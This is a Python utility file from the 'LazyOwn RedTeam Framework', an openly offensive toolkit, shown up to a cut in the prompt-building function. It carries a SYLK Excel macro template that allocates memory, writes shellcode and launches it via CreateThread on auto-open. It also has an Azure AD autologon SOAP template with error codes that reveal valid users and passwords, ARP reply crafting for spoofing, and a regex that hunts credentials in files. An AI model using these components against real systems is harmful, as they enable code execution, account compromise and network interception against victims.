"""
utils.py

Autor: Gris Iscomeback 
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de la lógica de todas las funciones usadas en la clase LazyOwnShell

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""
import re
import os
import io
import csv
import sys
import ssl
import gzip
import json
import time
import yaml
import uuid
import glob
import shlex
import shutil
import bisect
import pickle
import signal
import base64
import curses
import string
import ctypes
import socket
import struct
import random
import libnmap
import argparse
import binascii
import readline
import requests
import tempfile
import itertools
import threading
import subprocess
import urllib.parse
import pandas as pd
import urllib.request
import importlib.util
from PIL import Image
from threading import Timer
from bs4 import BeautifulSoup
from itertools import product
from pykeepass import PyKeePass
import xml.etree.ElementTree as ET
from html.parser import HTMLParser
from stix2 import MemoryStore, Filter
from libnmap.parser import NmapParser
from netaddr import IPAddress, IPRange
from libnmap.process import NmapProcess
from impacket.dcerpc.v5 import transport
from concurrent.futures import ThreadPoolExecutor
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from modules.lazyencoder_decoder import encode, decode
from datetime import datetime, timedelta, date, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote, unquote, urlparse, urljoin
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from requests.exceptions import ConnectionError, RequestException



query_id = 0
RESET = "\033[0m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
INVERT = "\033[7m"
BLINK = "\033[5m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"
BRIGHT_BLACK = "\033[90m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
BRIGHT_WHITE = "\033[97m"
BG_BRIGHT_BLACK = "\033[100m"
BG_BRIGHT_RED = "\033[101m"
BG_BRIGHT_GREEN = "\033[102m"
BG_BRIGHT_YELLOW = "\033[103m"
BG_BRIGHT_BLUE = "\033[104m"
BG_BRIGHT_MAGENTA = "\033[105m"
BG_BRIGHT_CYAN = "\033[106m"
BG_BRIGHT_WHITE = "\033[107m"

COLOR_256 = "\033[38;5;{}m"
BG_COLOR_256 = "\033[48;5;{}m"
TRUE_COLOR = "\033[38;2;{};{};{}m"
BG_TRUE_COLOR = "\033[48;2;{};{};{}m"

window_count = 0
session_name = "lazyown_sessions"
NOBANNER = False
COMMAND = None
NOLOGS = False
RUN_AS_ROOT = False
os.environ['OPENSSL_CONF'] = '/usr/lib/ssl/openssl.cnf'
global payload_url, target_domain, concurrency, request_timeout, include_subdomains
OLD_BANNER = f"""{GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠴⠶⠖⠒⠛⠛⠀⠀⠀⠒⠒⢰⠖⢠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣭⠷⠞⠉⠫⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠈⠉⠒⠲⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣷⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⢄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⡾⢋⠷⣻⣿⣟⢿⣿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠸⣄⠀⠀⠀⠀
⠀⠀⠀⣀⣾⣯⢶⣿⣾⣿⡟⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢦⠀⠀⠀
⠀⠀⢠⣿⣿⣤⣽⣿⣿⣿⣃⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⢀⣽⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣴⣆⣀⣀⣀⣀⢀⠀⠀⣐⠄⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⢀⣀⠴⠶⠛⠛⠛⠛⠛⠳⠶⣶⣦⡀⠀⠀⠘
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠐⠤⣯⣀⡰⡋⣡⣐⣶⣽⣶⣶⣾⣿⣷⣶⣤⣝⡣⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⣿⣿⣿⣿⣿⣿⣿⣭⡿⣿⡋⠉⠙⢿⡦⠀⠀⠀⠀⠀⠀⠀⢀⣌⣼⡩⢻⣷⣿⣿⣿⣿⣿⣿⡏⣛⢿⣿⣿⡿⠃⢰⠀⠀
⠀⢿⣿⣿⣿⣿⣿⣿⣛⠿⣷⣄⣙⣿⠿⠿⠟⠛⣿⣿⣜⣶⡂⡉⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⢻⣾⡛⠛⢿⠿⠿⠟⢻⣧⣽⣿⠿⠋⠀⠄⢸⣧⠔
⠀⠘⢿⣿⣿⣿⣿⢿⣿⣿⣷⣾⣭⣿⣿⣟⣛⣛⣛⣛⢿⣽⣿⣧⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠃⣿⡿⠿⠿⠿⠿⢻⣛⣛⣋⣉⣁⠤⠒⠒⠂⣠⣿⠏⠀
⠀⠀⠈⠻⢿⣿⣿⣶⣄⣉⠉⠉⠉⠉⠉⠛⠉⠉⠁⠉⠁⢹⢻⣿⣏⢹⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣀⣴⠿⠝⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣶⣦⣴⣴⣾⢬⡤⢬⡜⠛⠀⢾⢿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠶⣦⣤⣄⣤⣐⣢⣤⣴⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣄⡤⣄⣠⡤⣄⣀⠀⠀⠀⠀⡀⠀⠀⠀⡀⠀⠀⢀⣠⣤⣴⣤⣤⢹⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣬⣥⣤⡴⠶⠶⠖⠒⠛⠋⠉⡩⢁⣼⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⡓⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⢶⣧⣻⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠾⠀⠀⠀⠀⠀⠀⠀⠀⣀⡜⠼⣷⣸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣶⣄⣀⣀⣀⡀⠀⢀⠀⠀⣠⡼⣋⣪⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⡟⠙⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⡿⡁⡟⣡⢀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢛⠀⣸⠆⠈⠹⠀⠀⠀⠀⠀⠀⠀{RED}
 ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                 ░         ░ ░                                                
  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
    [⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] """
BANNER = "[⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] "
SYLK_TEMPLATE = """ID;P
O;E
NN;NAuto_open;ER1C1
C;X1;Y1;ER1C2()
C;X1;Y2;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
C;X1;Y3;ESELECT(R1C2:R1000:C2,R1C2)
C;X1;Y4;ESET.VALUE(R1C3, 0)
C;X1;Y5;EWHILE(LEN(ACTIVE.CELL())>0)
C;X1;Y6;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X1;Y7;ESET.VALUE(R1C3, R1C3 + 1)
C;X1;Y8;ESELECT(, "R[1]C")
C;X1;Y9;ENEXT()
C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
C;X1;Y11;EHALT()
"""
detailed_codes = {'AADSTS50034' : 'The user does not exist', 
'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
'AADSTS50126' : 'The user exists, but the wrong password was entered',
'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded',
'AADSTS81016' : 'Invalid STS Request (User likely exists)' }

url_template = string.Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")

xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:MessageID>urn:uuid:36a6762f-40a9-4279-b4e6-b01c944b5698</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
    <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
      <u:Timestamp u:Id="_0">
        <u:Created>2019-01-02T14:30:02.068Z</u:Created>
        <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
      </u:Timestamp>
      <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
        <o:Username>$username@$domain</o:Username>
        <o:Password>$password</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
      <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
        <a:EndpointReference>
          <a:Address>urn:federation:MicrosoftOnline</a:Address>
        </a:EndpointReference>
      </wsp:AppliesTo>
      <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
      <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
    </trust:RequestSecurityToken>
  </s:Body>
</s:Envelope>""")
def parse_ip_mac(input_string):
    """
    Extracts IP and MAC addresses from a formatted input string using a regular expression.

    The input string is expected to be in the format: 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.
    The function uses a regular expression to match and extract the IP address and MAC address from the input.

    Args:
        input_string (str): The formatted string containing the IP and MAC addresses.

    Returns:
        tuple: A tuple containing the extracted IP address and MAC address. If the format is incorrect, returns (None, None).
    """
    match = re.match(r"IP:\s*\(([\d.]+)\)\s*MAC:\s*([\da-f:]+)", input_string.strip())
    if match:
        target_ip, target_mac = match.groups()
        return target_ip, target_mac
    else:
        print_error("Error: Input must be in the format 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.")
        return None, None

def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
    """
    Constructs an ARP packet with the given source and destination IP and MAC addresses.

    The function creates both Ethernet and ARP headers, combining them into a complete ARP packet.

    Args:
        src_mac (str): Source MAC address in the format 'xx:xx:xx:xx:xx:xx'.
        src_ip (str): Source IP address in dotted decimal format (e.g., '192.168.1.1').
        dst_ip (str): Destination IP address in dotted decimal format (e.g., '192.168.1.2').
        dst_mac (str): Destination MAC address in the format 'xx:xx:xx:xx:xx:xx'.

    Returns:
        bytes: The constructed ARP packet containing the Ethernet and ARP headers.
    """
    eth_header = struct.pack(
        '!6s6sH',
        binascii.unhexlify(dst_mac.replace(':', '')),
        binascii.unhexlify(src_mac.replace(':', '')),
        0x0806
    )

    arp_header = struct.pack(
        '!HHBBH6s4s6s4s',
        0x0001,
        0x0800,
        6,      
        4,      
        0x0002, 
        binascii.unhexlify(src_mac.replace(':', '')),
        socket.inet_aton(src_ip),
        binascii.unhexlify(dst_mac.replace(':', '')),
        socket.inet_aton(dst_ip) 
    )

    return eth_header + arp_header

def send_packet(packet, iface):
    """
    Sends a raw ARP packet over the specified network interface.

    The function creates a raw socket, binds it to the specified network interface, and sends the given packet.

    Args:
        packet (bytes): The ARP packet to be sent.
        iface (str): The name of the network interface to use for sending the packet (e.g., 'eth0').

    Raises:
        OSError: If an error occurs while creating the socket or sending the packet.
    """
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806)) as sock:
        sock.bind((iface, 0))
        sock.send(packet)

def load_version():
    """
    Load the version number from the 'version.json' file.

    This function attempts to open the 'version.json' file and load its contents. 
    If the file is found, it retrieves the version number from the JSON data. 
    If the version key does not exist, it returns a default version 'release/v0.0.14'. 
    If the file is not found, it also returns the default version.

    Returns:
    - str: The version number from the file or the default version if the file is not found or the version key is missing.
    """    
    try:
        with open('version.json', 'r') as f:
            data = json.load(f)
            return data.get('version', 'release/v0.0.14')
    except FileNotFoundError:
        return 'release/v0.0.14'

version = load_version()
url_download = f"https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz"
def print_error(error):
    """
    Prints an error message to the console.

    This function takes an error message as input and prints it to the console
    with a specific format to indicate that it is an error.

    :param error: The error message to be printed.
    :type error: str
    :return: None
    """
    print(f"    {YELLOW}[-]{RED} {error}{RESET} [☠]")
    return


def print_msg(msg):
    """
    Prints a message to the console.

    This function takes a message as input and prints it to the console
    with a specific format to indicate that it is an informational message.

    :param msg: The message to be printed.
    :type msg: str
    :return: None
    """

    print(f"    {GREEN}[+]{WHITE} {msg}{RESET} [👽]")
    return


def print_warn(warn):
    """
    Prints a warning message to the console.

    This function takes a warning message as input and prints it to the console
    with a specific format to indicate that it is a warning.

    :param warn: The warning message to be printed.
    :type warn: str
    :return: None
    """

    print(f"    {MAGENTA}[~]{YELLOW} {warn}{RESET} [⚠]")
    return


def signal_handler(sig, frame):
    """
    Handles signals such as Control + C and shows a message on how to exit.

    This function is used to handle signals like Control + C (SIGINT) and prints
    a warning message instructing the user on how to exit the program using the
    commands 'exit', 'q', or 'qa'.

    :param sig: The signal number.
    :type sig: int
    :param frame: The current stack frame.
    :type frame: frame
    :return: None
    """

    global should_exit
    print_warn(
        f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}"
    )
    should_exit = True
    readline.set_history_length(0)
    return


signal.signal(signal.SIGINT, signal_handler)


def check_rhost(rhost):
    """
    Checks if the remote host (rhost) is defined and shows an error message if it is not.

    This function verifies if the `rhost` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param rhost: The remote host to be checked.
    :type rhost: str
    :return: True if rhost is defined, False otherwise.
    :rtype: bool
    """

    if not rhost:
        print_error(
            f"rhost must be set, {GREEN}Example: set rhost 10.10.10.10, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def check_lhost(lhost):
    """
    Checks if the local host (lhost) is defined and shows an error message if it is not.

    This function verifies if the `lhost` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param lhost: The local host to be checked.
    :type lhost: str
    :return: True if lhost is defined, False otherwise.
    :rtype: bool
    """

    if not lhost:
        print_error(
            f"lhost must be set, {GREEN}Example: set lhost 10.10.10.10, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def check_lport(lport):
    """
    Checks if the local port (lport) is defined and shows an error message if it is not.

    This function verifies if the `lport` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param lport: The local port to be checked.
    :type lport: int or str
    :return: True if lport is defined, False otherwise.
    :rtype: bool
    """

    if not lport:
        print_error(
            f"lport must be set, {GREEN}Example: set lport 5555, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def is_binary_present(binary_name):
    """
    Internal function to verify if a binary is present on the operating system.

    This function checks if a specified binary is available in the system's PATH
    by using the `which` command. It returns True if the binary is found and False
    otherwise.

    :param binary_name: The name of the binary to be checked.
    :type binary_name: str
    :return: True if the binary is present, False otherwise.
    :rtype: bool
    """
    result = os.system(f"which {binary_name} > /dev/null 2>&1")
    return result == 0


def handle_multiple_rhosts(func):
    """
    Internal function to handle multiple remote hosts (rhost) for operations.

    This function is a decorator that allows an operation to be performed across
    multiple remote hosts specified in `self.params["rhost"]`. It converts a single
    remote host into a list if necessary, and then iterates over each host,
    performing the given function with each host. After the operation, it restores
    the original remote host value.

    :param func: The function to be decorated and executed for each remote host.
    :type func: function
    :return: The decorated function.
    :rtype: function
    """

    def wrapper(self, *args, **kwargs):
        """internal wrapper of internal function to implement multiples rhost to operate. """
        rhosts = self.params["rhost"]
        if isinstance(rhosts, str):
            rhosts = [rhosts]  

        for rhost in rhosts:
            if not check_rhost(rhost):
                continue
            original_rhost = self.params["rhost"]
            self.params["rhost"] = rhost  
            func(self, *args, **kwargs)
            self.params["rhost"] = original_rhost  

    return wrapper



def check_sudo():
    """
    Checks if the script is running with superuser (sudo) privileges, and if not,
    restarts the script with sudo privileges.

    This function verifies if the script is being executed with root privileges
    by checking the effective user ID. If the script is not running as root,
    it prints a warning message and restarts the script using sudo.

    :return: None
    """

    if os.geteuid() != 0:
        print_warn(
            "Este script necesita permisos de superusuario. Relanzando con sudo..."
        )
        args = ["sudo", sys.executable] + sys.argv
        os.execvpe("sudo", args, os.environ)


def activate_virtualenv(venv_path):
    """
    Activates a virtual environment and starts an interactive shell.

    This function activates a virtual environment located at `venv_path` and then
    launches an interactive bash shell with the virtual environment activated.

    :param venv_path: The path to the virtual environment directory.
    :type venv_path: str
    :return: None
    """

    process = subprocess.Popen(
        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    # Captura la salida del proceso hijo
    stdout, stderr = process.communicate()
    print_msg(f"Environment Activated.{RESET}")


def parse_proc_net_file(file_path):
    """
    Internal function to parse a /proc/net file and extract network ports.

    This function reads a file specified by `file_path`, processes each line to
    extract local addresses and ports, and converts them from hexadecimal to decimal.
    The IP addresses are converted from hexadecimal format to standard dot-decimal
    notation. The function returns a list of tuples, each containing an IP address
    and a port number.

    :param file_path: The path to the /proc/net file to be parsed.
    :type file_path: str
    :return: A list of tuples, each containing an IP address and a port number.
    :rtype: list of tuple
    """

    ports = []
    try:
        with open(file_path, "r") as f:
            lines = f.readlines()

        for line in lines[1:]:  # Skip the header line
            parts = line.split()
            if len(parts) < 2:
                continue

            local_address = parts[1]
            # Local address is in the format: "IP:PORT"
            ip, port_hex = local_address.split(":")
            port = int(port_hex, 16)  # Convert hex port to decimal

            # Convert IP address from hex format to standard dot-decimal notation
            ip_parts = [str(int(ip[i : i + 2], 16)) for i in range(0, len(ip), 2)]
            ip_address = ".".join(ip_parts[::-1])  # Reverse the IP parts

            ports.append((ip_address, port))
    except FileNotFoundError:
        print_error(f"File {file_path} not found{RESET}")
    except Exception as e:
        print_error(f"An error occurred: {e}{RESET}")

    return ports


def get_open_ports():
    """
    Internal function to get open TCP and UDP ports on the operating system.

    This function uses the `parse_proc_net_file` function to extract open TCP and UDP
    ports from the corresponding /proc/net files. It returns two lists: one for TCP
    ports and one for UDP ports.

    :return: A tuple containing two lists: the first list with open TCP ports and
            the second list with open UDP ports.
    :rtype: tuple of (list of tuple, list of tuple)
    """

    tcp_ports = parse_proc_net_file("/proc/net/tcp")
    udp_ports = parse_proc_net_file("/proc/net/udp")

    return tcp_ports, udp_ports


def find_credentials(directory):
    """
    Searches for potential credentials in files within the specified directory.

    This function uses a regular expression to find possible credentials such as
    passwords, secrets, API keys, and tokens in files within the given directory.
    It iterates through all files in the directory and prints any matches found.

    :param directory: The directory to search for files containing credentials.
    :type directory: str
    :return: None
    """
    regex = re.compile(
        r"(password|passwd|secret|api_key|token)[\s:=]*[\w\d]{6,}", re.IGNORECASE
    )

    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                with open(os.path.join(root, file), "r") as f:
                    content = f.read()
                    matches = regex.findall(content)
                    if matches:
                        print_msg(
                            f"Credenciales encontradas en {os.path.join(root, file)}:"
                        )
                        for match in matches:
                            print_msg(f"{match}")
            except Exception as e:
                print_error(f"No se pudo leer el archivo {file}: {e}")
        

def rotate_char(c, shift):
    """
    Internal function to rotate characters for ROT cipher.

    This function takes a character and a shift value, and rotates the character
    by the specified shift amount. It only affects alphabetical characters, leaving
    non-alphabetical characters unchanged.

    :param c: The character to be rotated.
    :type c: str
    :param shift: The number of positions to shift the character.
    :type shift: int
    :return: The rotated character.
    :rtype: str
    """

    if c in string.ascii_letters:
        start = ord('a') if c.islower() else ord('A')
        return chr((ord(c) - start + shift) % 26 + start)
    return c

def get_network_info():
    """
    Retrieves network interface information with their associated IP addresses.

    This function executes a shell command to gather network interface details, 
    parses the output to extract interface names and their corresponding IP addresses, 
    and returns this information in a dictionary format. The dictionary keys are
    interface names, and the values are IP addresses.

    :return: A dictionary where the keys are network interface names and the values
             are their associated IP addresses.
    :rtype: dict
    """
    command = (
        'ip a show scope global | '
        'awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } '
        '/^[[:space:]]*inet / { split($2, a, "/"); print iface " " a[1] }\''
    )
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout.strip()
    network_info = {}

    for line in output.split('\n'):
        parts = line.split(maxsplit=1)
        if len(parts) == 2:
            iface, ip = parts
            network_info[iface] = ip
        else:
            print_error(f"Formato inesperado en la línea: '{line}'")

    return network_info

def getprompt():
    """Generate a command prompt string with network information and user status.

    :param: None

    :returns: A string representing the command prompt with network information and user status.

    Manual execution:
    To manually get a prompt string with network information and user status, ensure you have `get_network_info()` implemented to return a dictionary of network interfaces and their IPs. Then use the function to create a prompt string based on the current user and network info.

    Example:
    If the function `get_network_info()` returns:
        {
            'tun0': '10.0.0.1',
            'eth0': '192.168.1.2'
        }

    And the user is root, the prompt string generated might be:
        [LazyOwn👽10.0.0.1]# 
    If the user is not root, it would be:
        [LazyOwn👽10.0.0.1]$ 

    If no 'tun' interface is found, the function will use the first available IP or fallback to '127.0.0.1'.
    """

    network_info = get_network_info()
    ip = next((ip for iface, ip in network_info.items() if 'tun' in iface), None)
    hostname = socket.gethostname()
    if ip is None:
        ip = next(iter(network_info.values()), '127.0.0.1')
    prompt_char = f'{RED}#' if os.geteuid() == 0 else '$'
    random_color = random.randint(0, 255)
    random_r = random.randint(0, 255)
    random_g = random.randint(0, 255)
